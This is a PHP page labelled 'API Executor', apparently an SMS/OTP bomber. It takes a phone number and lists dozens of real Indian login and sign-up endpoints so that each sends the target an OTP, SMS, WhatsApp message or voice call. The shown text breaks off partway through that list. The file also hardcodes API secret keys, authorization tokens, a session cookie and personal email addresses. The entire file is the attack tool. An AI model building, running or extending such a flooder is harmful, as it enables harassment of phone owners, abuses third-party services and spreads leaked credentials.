<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
</head>
<body>
    <h1>API Executor</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        $apis = [
                 
            [
                "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
                "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
            ],
            [
                "url" => "https://kukufm.com/api/v1/users/auth/send-otp/",
                "data" => json_encode(["phone_number" => "+91" . $mobile])
            ],
            [
                "url" => "https://apiprod.thebodyshop.in/user-service/api/v1/users/resend-otp",
                "data" => json_encode(["otpVia" => "mobile", "sg" => "dcb68d757272d371f609fe1bf866d8122b1cc1ed4c82eb2ca559f961ade224f7", "countryCode" => "+91", "mobileNo" => $mobile, "type" => "signup"])
            ],
            [
                "url" => "https://gateway.credmudra.com/public/send-otp",
                "data" => json_encode(["data" => ["contactNo" => $mobile, "resend" => false, "anonymousId" => "65d48590cbf0720f6eec2505"]])
            ],
            [
                "url" => "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=mobile&source=mobile&source_name=AudienceWeb",
                "data" => json_encode(["variables" => ["phone" => $mobile, "userAgent" => "Mozilla/5.0", "otpLength" => 4.0], "query" => "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n    ) {\n      success\n      message\n    }\n  }\n"])
            ],
            [
                "url" => "https://www.brevistay.com/cst/app-api/login",
                "data" => json_encode(["is_otp" => 1.0, "mobile" => $mobile, "is_password" => 0.0])
            ],
            [
                "url" => "https://apis.bakingo.com/api/bakingo/fa/users/sendOtp",
                "data" => json_encode(["country_code" => "91", "userData" => $mobile, "resend_otp" => 0.0, "user_name" => "Hii"])
            ],
            [
                "url" => "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
                "data" => json_encode(["mfa_channels" => ["phno" => ["number" => (float)$mobile, "country_code" => "+91"]]])
            ],
            [
                "url" => "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
                "data" => json_encode(["locationUrl" => "https://cars.tatamotors.com", "reqBody" => ["countryCode" => "91", "phone" => $mobile, "sendOtp" => "true"]])
            ],
            [
                "url" => "https://admin.vedistry.com/graphql",
                "data" => json_encode(["query" => "\nmutation {\n    createAccountOTP(\n        mobilenumber:\"91" . $mobile . "\",\n        websiteId:1\n    )\n        {\n            status\n            message\n        }\n}"])
            ],
        [
            'url' => "https://parksmart.in/website/sendLink",
            'data' => json_encode(['mobile' => $mobile]),
        ],
        [
            'url' => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            'data' => json_encode(['country_code' => '+91', 'phone' => $mobile]),
        ],
        [
            'url' => "https://apiprod.thebodyshop.in/user-service/api/v1/users/resend-otp",
            'data' => json_encode([
                'otpVia' => 'mobile',
                'sg' => 'dcb68d757272d371f609fe1bf866d8122b1cc1ed4c82eb2ca559f961ade224f7',
                'countryCode' => '+91',
                'mobileNo' => $mobile,
                'type' => 'signup'
            ]),
        ],
        [
            'url' => "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            'data' => json_encode(['mfa_channels' => ['phno' => ['number' => (float)$mobile, 'country_code' => '+91']]]),
        ],
            [
                "url" => "https://api.countrydelight.in/api/auth/new_request_otp",
                "data" => json_encode(["new_user" => true, "mobile_no" => $mobile]),
            ],
            [
                "url" => "https://entri.app/api/v3/users/check-phone/",
                "data" => json_encode(["phone" => "+91$mobile"]),
            ],
            [
                "url" => "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
                "data" => json_encode(["buildVersion" => "24.0", "phone" => $mobile, "source" => "signup", "type" => "p", "device" => "mobile", "email" => ""]),
            ],
            [
                "url" => "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
                "data" => json_encode(["mobile_number" => $mobile, "client_id" => "kisan-app"]),
            ],
            [
                "url" => "https://www.gyftr.com/smartbuyapi/hdfc/api/v1/v2/sent/otp_register",
                "data" => json_encode(["mobile" => $mobile, "otp_type" => "REGISTER"]),
            ],
            [
                "url" => "https://api.doubtnut.com/v4/student/login",
                "data" => json_encode(["app_version" => "7.10.2", "aaid" => "a4c4e462-2744-4c94-85ea-db8b47f75d00", "course" => "", "phone_number" => $mobile, "language" => "en", "udid" => "0ae3a1bee1561e32", "class" => "", "gcm_reg_id" => "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"]),
            ],
            [
                "url" => "https://api.myhubble.money/v1/auth/otp/generate",
                "data" => json_encode(["phoneNumber" => $mobile, "medium" => "WHATSAPP"]),
            ],
            [
                "url" => "https://www.c377768625-eu.com/sendotp",
                "data" => json_encode(["phoneNumber" => "+91$mobile", "apiKey" => "3__kVl5g5H3qeFTZkCfm0F11jv0lwwsr_I3cGBk5gi1gSZkuAiwx3NxN9EtQcgoeax", "locale" => "en"]),
            ],
            [
                "url" => "https://www.spencers.in/graphql",
                "data" => json_encode(["variables" => [], "query" => "{ registerOtp(mobile: \"$mobile\" action: \"registerotp\" legalencode: \"true\") { status data { expirytime } message } }"]),
            ],
            [
                "url" => "https://api.shadowfax.in/delivery/otp/send/",
                "data" => json_encode(["mobile_number" => $mobile]),
            ],
            [
                'url' => 'https://www.spencers.in/graphql',
                'data' => [
                    'variables' => [],
                    'query' => "{ registerOtp(mobile: \"$mobile\", action: \"registerotp\", legalencode: \"true\") { status data { expirytime } message } }"
                ]
            ],
     
            [
                "url" => "https://railmadad.indianrailways.gov.in/madad/FetchData?mobile={$mobile}&email=&fetchdatatype=userotp",
                "data" => null
            ],
            [
                "url" => "https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no={$mobile}",
                "data" => null
            ],
            [
                "url" => "https://api.magicbricks.com/bricks/resendOTPMobile.html?&autoId=980685ad-ccd0-4182-840f-fc9f39daf945&mobile={$mobile}",
                "data" => null
            ],
            [
                "url" => "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={$mobile}&version_number=600&app_install_session_id=e8a160e142ce03b1d8ea3babc9fed478",
                "data" => null
            ],
            [
                "url" => "https://sso.amarujala.com/v2/auth/nkit/sendotp?country_code=91&mobile={$mobile}&platform=Android&hash=OTE5MzM2NzM0NDQy",
                "data" => null
            ],
            [
                "url" => "https://vyaparapp.in/resend/otp?email={$mobile}&country_code=91",
                "data" => null
            ],
            [
                "url" => "https://digital.allen.ac.in/api/ecom/otp/otp_generate",
                "data" => null
            ],
            [
                "url" => "https://www.justdial.com/functions/whatsappverification.php?name=Hi%2BJistididi&rsend=0&mob={$mobile}",
                "data" => null
            ],
            [
                "url" => "https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH%2BDELHI&lgBranch=0313&lgMobileno={$mobile}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber={$mobile}&login=gjghgug%40gmail.com&genderType=Male",
                "data" => null
            ],
                       [
                "url" => "https://dmrc.autope.in/auth/v1/user/verify-mobile",
                "data" => json_encode(["mobileNumber" => $mobile])
            ],
            [
                "url" => "https://intapi.dhurina.net/api/send_otp",
                "data" => json_encode(["phone" => $mobile])
            ],
            [
                "url" => "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
                "data" => json_encode(["organizationId" => "64254d66be2a390018e6d348", "mobile" => $mobile])
            ],
            [
                "url" => "https://mobileonline.sai.org.in/ssst/mobileLoginOtp",
                "data" => json_encode(["mobileNumber" => $mobile])
            ],
            [
                "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
                "data" => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile])
            ],
            [
                "url" => "https://ohmelogistics.com/check_user_registered",
                "data" => json_encode(["country_phone_code" => "+91", "phone" => $mobile])
            ],
            [
                "url" => "https://force.eazydiner.com/web/otp",
                "data" => json_encode(["mobile" => "+91" . $mobile])
            ],
            [
                "url" => "https://consumerbff.milkbasket.com/graphql",
                "data" => json_encode([
                    "variables" => [
                        "phone" => $mobile,
                        "retry" => false,
                        "retryType" => "",
                        "appHash" => "",
                        "udid" => "web_login"
                    ],
                    "query" => "mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status __typename } }",
                    "operationName" => "registerNumber"
                ])
            ],
            [
                "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp",
                "data" => json_encode([
                    "mobile_psid" => $mobile,
                    "activity_type" => "aakash-myadmission",
                    "webengageData" => [
                        "profile" => "student",
                        "whatsapp_opt_in" => true,
                        "method" => "mobile"
                    ],
                    "mobile_number" => ""
                ])
            ],
            [
                "url" => "https://1.rome.api.flipkart.com/1/action/view?=",
                "headers" => [
                    "X-user-agent" => "Mozilla/5.0 (Linux; Android 9; RMX1833 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile",
                    "Content-Type" => "application/json; charset=utf-8",
                    "Content-Length" => "277",
                    "Host" => "1.rome.api.flipkart.com",
                    "Connection" => "Keep-Alive",
                    "Accept-Encoding" => "gzip",
                    "User-Agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "actionRequestContext" => [
                        "type" => "LOGIN_IDENTITY_VERIFY",
                        "loginIdPrefix" => "+91",
                        "loginId" => $mobile,
                        "clientQueryParamMap" => [
                            "ret" => "/",
                            "entryPage" => "HOMEPAGE_HEADER_ACCOUNT"
                        ],
                        "loginType" => "MOBILE",
                        "verificationType" => "OTP",
                        "screenName" => "LOGIN_V4_MOBILE",
                        "sourceContext" => "DEFAULT"
                    ]
                ])
            ],
            [
                "url" => "https://api.khatabook.com/v1/auth/request-otp",
                "headers" => [
                    "Host" => "api.khatabook.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "73",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "app_signature" => "Jc/Zu7qNqQ2",
                    "country_code" => "+91",
                    "phone" => $mobile
                ])
            ],
            [
                "url" => "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
                "headers" => [
                    "Host" => "api.penpencil.co",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "76",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "firstName" => "Hiii",
                    "lastName" => "",
                    "countryCode" => "+91",
                    "mobile" => $mobile
                ])
            ],
            [
                "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
                "headers" => [
                    "Host" => "www.rummycircle.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "123",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "isPlaycircle" => false,
                    "mobile" => $mobile,
                    "deviceId" => "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
                    "deviceName" => "",
                    "refCode" => ""
                ])
            ],
            [
                "url" => "https://www.dream11.com/auth/passwordless/init",
                "headers" => [
                    "Host" => "www.dream11.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "85",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "phoneNumber" => $mobile,
                    "templateName" => "default",
                    "channel" => "sms",
                    "flow" => "SIGNIN"
                ])
            ],
            [
                "url" => "https://www.samsung.com/in/api/v1/sso/otp/init",
                "headers" => [
                    "Host" => "www.samsung.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "24",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "user_id" => $mobile
                ])
            ],
            [
                "url" => "https://www.nykaafashion.com/webscripts/api/otp/generate",
                "headers" => [
                    "Host" => "www.nykaafashion.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "32",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "customer_mobile" => $mobile
                ])
            ],
            [
                "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "headers" => [
                    "Host" => "mobapp.tatacapital.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "67",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "phone" => $mobile,
                    "applSource" => "",
                    "isOtpViaCallAtLogin" => "true"
                ])
            ],
            [
                "url" => "https://www.tataplay.com/inception-pack/otp/resend-otp",
                "headers" => [
                    "Host" => "www.tataplay.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "46",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "id" => $mobile,
                    "journeySource" => "REGISTER"
                ])
            ],
            [
                "url" => "https://www.shopsy.in/api/1/action/view",
                "headers" => [
                    "Content-Type" => "application/json; charset=utf-8",
                    "Content-Length" => "430",
                    "Host" => "www.shopsy.in",
                    "Connection" => "Keep-Alive",
                    "Accept-Encoding" => "gzip",
                    "User-Agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "actionRequestContext" => [
                        "type" => "LOGIN_IDENTITY_VERIFY",
                        "loginIdPrefix" => "+91",
                        "loginId" => $mobile,
                        "clientQueryParamMap" => [
                            "ret" => "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
                            "entryPage" => "HEADER_ACCOUNT"
                        ],
                        "loginType" => "MOBILE",
                        "verificationType" => "OTP",
                        "screenName" => "LOGIN_V4_MOBILE",
                        "sourceContext" => "DEFAULT"
                    ]
                ])
            ],
            [
                "url" => "https://entri.app/api/v3/users/check-phone/",
                "headers" => [
                    "Host" => "entri.app",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "22",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "phone" => $mobile
                ])
            ],
            [
                "url" => "https://seller.flipkart.com/napi/graphql",
                "headers" => [
                    "Content-Type" => "application/json; charset=utf-8",
                    "Content-Length" => "216",
                    "Host" => "seller.flipkart.com",
                    "Connection" => "Keep-Alive",
                    "Accept-Encoding" => "gzip",
                    "User-Agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "variables" => [
                        "mobileNo" => $mobile
                    ],
                    "query" => "mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n",
                    "operationName" => "SellerOnboarding_GenerateOTPMobile"
                ])
            ],
            [
                "url" => "https://shop.royalchallengers.com/api/customer/login",
                "headers" => [
                    "Host" => "shop.royalchallengers.com",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "51",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "utype" => "Online",
                    "mobile" => $mobile,
                    "email" => ""
                ])
            ],
            [
                "url" => "https://customer.rapido.bike/api/otp",
                "headers" => [
                    "Host" => "customer.rapido.bike",
                    "content-type" => "application/json; charset=utf-8",
                    "content-length" => "23",
                    "accept-encoding" => "gzip",
                    "user-agent" => "okhttp/3.9.1"
                ],
                "data" => json_encode([
                    "mobile" => $mobile
                ])
            ],
            [
                "url" => "https://identity.tllms.com/api/request_otp",
                "data" => json_encode(["phone" => $mobile, "app_client_id" => "90391da1-ee49-4378-bd12-1924134e906e"])
            ],
            [
                "url" => "https://www.brevistay.com/cst/app-api/login",
                "data" => json_encode(["is_otp" => 1.0, "mobile" => $mobile, "is_password" => 0.0])
            ],
            [
                "url" => "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
                "data" => json_encode(["mobile_number" => $mobile])
            ],
            [
                "url" => "https://webapi.tastes2plate.com/app/new-login",
                "data" => json_encode(["device_token" => "", "mobile" => $mobile, "reffer_by" => "", "device_type" => "web"])
            ],
            [
                "url" => "https://apis.tradeindia.com/app_login_api/login_app",
                "data" => json_encode(["mobile" => "+91" . $mobile])
            ],
            [
                "url" => "https://app.getswipe.in/api/user/mobile_login",
                "data" => json_encode(["resend" => 0.0, "mobile" => $mobile])
            ],
            [
                "url" => "https://api.playo.io/onboard/generateOTP",
                "data" => json_encode(["countryCode" => "+91", "mobile" => $mobile])
            ],
            [
                "url" => "https://m.snapdeal.com/sendOTP",
                "data" => json_encode(["purpose" => "LOGIN_WITH_MOBILE_OTP", "mobileNumber" => $mobile])
            ],
            [
                "url" => "https://tootoo.in/graphql",
                "data" => json_encode([
                    "variables" => ["mobile_no" => $mobile, "resend" => 0.0],
                    "query" => "query sendOtp($mobile_no: String!, $resend: Int!) {\n  sendOtp(mobile_no: $mobile_no, resend: $resend) {\n    success\n    __typename\n  }\n}",
                    "operationName" => "sendOtp"
                ])
            ],
            [
                "url" => "https://mrbrownbakery.com/public/api/reactotp",
                "data" => json_encode(["mobile" => $mobile])
            ],
            [
                "url" => "https://nfapi.naturefit.in/api/auth/localsignup",
                "data" => json_encode(["mobile" => $mobile])
            ],
            [
                "url" => "https://docon.co.in/api/v1/user/online-login",
                "data" => json_encode(["mobileNumber" => $mobile])
            ],
            [
                "url" => "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
                "data" => json_encode([
                    "screen" => "1260 X 2624",
                    "emailID" => "shivamyou2000@gmail.com",
                    "gps" => "true",
                    "imsi" => "",
                    "mobileNo" => $mobile,
                    "firstName" => "Shiva Riy",
                    "osVersion" => "14",
                    "build" => "android-phone",
                    "countryCode" => "91",
                    "vendor" => "samsung",
                    "imei" => "181105746967606",
                    "model" => "SM-F7110",
                    "req" => "generate"
                ])
            ],
            [
                "url" => "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger",
                "data" => json_encode(["rmn" => $mobile, "purpose" => "REGISTRATION"])
            ],
            [
                "url" => "https://www.my11circle.com/api/fl/auth/v3/getOtp",
                "data" => json_encode([
                    "isPlaycircle" => false,
                    "mobile" => $mobile,
                    "deviceId" => "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
                    "deviceName" => "",
                    "refCode" => ""
                ])
            ],
         [
                "url" => "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
                "data" => json_encode([
                    "mobile" => $mobile,
                    "deviceId" => "426c1fec-f7e1-426d-af86-ce191adfe9b2",
                    "deviceName" => "",
                    "refCode" => "",
                    "isPlaycircle" => false
                ])
            ],
            [
                "url" => "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
                "data" => json_encode([
                    "otpOnCall" => true,
                    "otpType" => 6,
                    "transactionId" => 0,
                    "mobile" => $mobile
                ])
            ],
            [
                "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
                "data" => json_encode([
                    "mobile" => $mobile,
                    "deviceId" => "8b15f59c-d7f5-4a94-b9e5-837e7f144850",
                    "deviceName" => "",
                    "refCode" => "",
                    "isPlaycircle" => false
                ])
            ],
            [
                "url" => "https://www.shoppersstop.com//services/v2_1/ssl/sendOTP/OB",
                "data" => json_encode([
                    "mobile" => $mobile,
                    "type" => "SIGNIN_WITH_MOBILE"
                ])
            ],
            [
                "url" => "https://loginprod.medibuddy.in/unified-login/user/register",
                "data" => json_encode([
                    "source" => "medibuddyInWeb",
                    "platform" => "medibuddy",
                    "phonenumber" => $mobile,
                    "flow" => "Retail-Login-Home-Flow",
                    "idealLoginFlow" => false,
                    "advertiserId" => "8f191ec6-b5c8-Ld51-830f-65892ff7fb13",
                    "mbUserId" => null
                ])
            ],
            [
                "url" => "https://my11circle.com/api/fl/auth/v3/getOtp",
                "data" => json_encode([
                    "mobile" => $mobile,
                    "deviceId" => "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
                    "deviceName" => "",
                    "refCode" => "",
                    "isPlaycircle" => false
                ])
            ],
            [
                "url" => "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
                "data" => json_encode([
                    "mobile" => $mobile,
                    "countryCode" => "+91",
                    "firstName" => "Hacker",
                    "lastName" => ""
                ])
            ],
            [
                "url" => "https://animall.in/zap/auth/login",
                "data" => json_encode([
                    "phone" => $mobile,
                    "signupPlatform" => "NATIVE_ANDROID"
                ])
            ],
            [
                "url" => "https://production.apna.co/api/userprofile/v1/otp/",
                "data" => json_encode([
                    "phone_number" => $mobile,
                    "retries" => 0,
                    "hash_type" => "employer",
                    "source" => "employer"
                ])
            ],
            [
                "url" => "https://dmrc.autope.in/auth/v1/user/verify-mobile",
                "data" => json_encode([
                    "mobileNumber" => $mobile
                ])
            ],
            [
                "url" => "https://nodebackend.apollodiagnostics.in/api/v1/user/send-otp",
                "data" => json_encode([
                    "mobileNumber" => $mobile
                ])
            ],
            [
                "url" => "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
                "data" => json_encode([
                    "country_code" => "91",
                    "mobile" => $mobile,
                    "locale" => "IN"
                ])
            ],
            [
                "url" => "https://identity.tllms.com/api/request_otp",
                "data" => json_encode([
                    "phone" => $mobile,
                    "app_client_id" => "90391da1-ee49-4378-bd12-1924134e906e"
                ])
            ],
            [
                "url" => "https://identity.tllms.com/api/request_otp",
                "data" => json_encode([
                    "phone" => $mobile,
                    "activate" => 1
                ])
            ],
            [
                "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
                "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
            ],
            [
                "url" => "https://api.wakefit.co/api/consumer-sms-otp/",
                "data" => json_encode(["mobile" => $mobile, "whatsapp_opt_in" => 1]),
                "headers" => [
                    "Host:api.wakefit.co",
                    "content-length:43",
                    "api-secret-key:ycq55IbIjkLb",
                    "my-cookie:undefined",
                    "sec-ch-ua-platform:Android",
                    "api-token:c84d563b77441d784dce71323f69eb42",
                    "sec-ch-ua:Android WebView;v=\"131\", Chromium;v=\"131\", Not_A Brand;v=\"24\"",
                    "sec-ch-ua-mobile:?1",
                    "user-agent:Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "accept:application/json, text/plain, */*",
                    "content-type:application/json",
                    "origin:https://www.wakefit.co",
                    "x-requested-with:pure.lite.browser",
                    "sec-fetch-site:same-site",
                    "sec-fetch-mode:cors",
                    "sec-fetch-dest:empty",
                    "referer:https://www.wakefit.co/",
                    "accept-encoding:gzip, deflate, br, zstd",
                    "accept-language:en-GB,en-US;q=0.9,en;q=0.8",
                    "priority:u=1, i"
                ]
            ],
            [
                "url" => "https://www.caratlane.com/cg/dhevudu",
                "data" => json_encode([
                    "query" => "mutation SendOtp($mobile:String, $isdCode:String, $otpType:String, $email:String){ SendOtp(input:{mobile:$mobile, isdCode:$isdCode, otpType:$otpType, email:$email}){ status{ message code } } }",
                    "variables" => ["mobile" => $mobile, "isdCode" => "91", "otpType" => "registerOtp"]
                ]),
                "headers" => [
                    "Host:www.caratlane.com",
                    "content-length:346",
                    "sec-ch-ua-platform:Android",
                    "authorization:14228ed447067691db55615e0804bfece3b96fe54f8abb9624055d1cdcefa6",
                    "sec-ch-ua:Android WebView;v=\"131\", Chromium;v=\"131\", Not_A Brand;v=\"24\"",
                    "x-authorization:14228ed447067691db55615e0804bfece3b96fe54f8abb9624055d1cdcefa6",
                    "x-amzn-trace-id:uniqid=40599x54m429upya-1736185766984",
                    "sec-ch-ua-mobile:?1",
                    "setsamesite:true",
                    "ib:false",
                    "uniqid:40599x54m429upya-1736185766984",
                    "user-agent:Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "accept:application/json, text/plain, */*",
                    "cs-request:true",
                    "content-type:application/json",
                    "cookieenabled:true",
                    "origin:https://www.caratlane.com",
                    "x-requested-with:pure.lite.browser",
                    "sec-fetch-site:same-origin",
                    "sec-fetch-mode:cors",
                    "sec-fetch-dest:empty",
                    "referer:https://www.caratlane.com/login",
                    "accept-encoding:gzip, deflate, br, zstd",
                    "accept-language:en-GB,en-US;q=0.9,en;q=0.8",
                    "cookie:rb_uid=40599x54m429upya",
                    "cookie:showHighlightForRecentlyViewedStoreLink=true",
                    "cookie:G_ENABLED_IDPS=google",
                    "cookie:nitrox=6de89fc1-2a23-4d95-a64a-3fd743623d1a",
                    "cookie:BP=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQwNTlhMGhtNWxjNTV2aiIsImV4cCI6MTczODc4MDE5OSwiaWF0IjoxNzM2MTg1NzA3LCJhdWQiOiJXZWIiLCJpc3MiOiJDYXJhdGxhbmUifQ.VwxYMBgmZz8IqbKREzEeNHfrfyu2q1BD9PjxKjKQK2f8lMY5V_Js-JgB95mfOcc_5evN27xqtyytz03JXnqT-KmBJ17ErTl6K7AIXJTG4p_-SpzNiFHHHO-nmNjj84ad7Egyv9YEuEVvWSupr9a85ou6GGSbrnAMUufOnwhha-T4Jz-lA5cz_nSY8zUmK7r77zumMX38-12VjoK78OjSRmiNRoT3Oez4ZxcILqifMtZPoIwUDkdA0XGI3p_ep9JA1jhCmokrGUKqs95XJVJENAYSmNPlg6jCBRPRoMxC9G_9Gi5zIp-HJy6ThzVU3txYuM_4-Rtd5a90sMu3slnbfw",
                    "priority:u=1, i"
                ]
            ],
        
        // New API 1 - Limeroad OTP Request
            [
                "url" => "https://www.limeroad.com/auth/resend_otp",
                "data" => json_encode([
                    "user_id" => $mobile,
                    "ruid" => "70e45bb5-ef00-4682-829e-84b41556a9e7"
                ]),
                "headers" => [
                    "Host: www.limeroad.com",
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "Accept: */*",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
                    "Origin: https://www.limeroad.com",
                    "X-Requested-With: pure.lite.browser"
                ]
            ],
            // New API 2 - Foxy OTP Request
            [
                "url" => "https://www.foxy.in/api/v2/users/send_otp",
                "data" => json_encode([
                    "guest_token" => "01943c60-aea9-7ddc-b105-e05fbcf832be",
                    "user" => [
                        "phone_number" => $mobile
                    ]
                ]),
                "headers" => [
                    "Host: www.foxy.in",
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "Accept: application/json",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
                    "Origin: https://www.foxy.in",
                    "X-Requested-With: pure.lite.browser"
                ]
            ],
            // New API 3 - Smytten OTP Request
            [
                "url" => "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
                "data" => json_encode([
                    "phone" => $mobile,
                    "email" => "sdhabai09@gmail.com",
                    "device_platform" => "web"
                ]),
                "headers" => [
                    "Host: route.smytten.com",
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8",
                    "Origin: https://smytten.com",
                    "X-Requested-With: pure.lite.browser"
                ]
            ],
        
        [
                "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
                "data" => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile]),
                "headers" => [
                    "Host: api.penpencil.co",
                    "Content-Type: application/json; charset=utf-8",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/3.9.1"
                ]
            ],
            // Second API
            [
                "url" => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=" . $mobile,
                "data" => null,
                "headers" => [
                    "Host: api.univest.in",
                    "Accept-Encoding: gzip",
                    "User-Agent: okhttp/3.9.1"
                ]
            ],
            // Third API
            [
                "url" => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
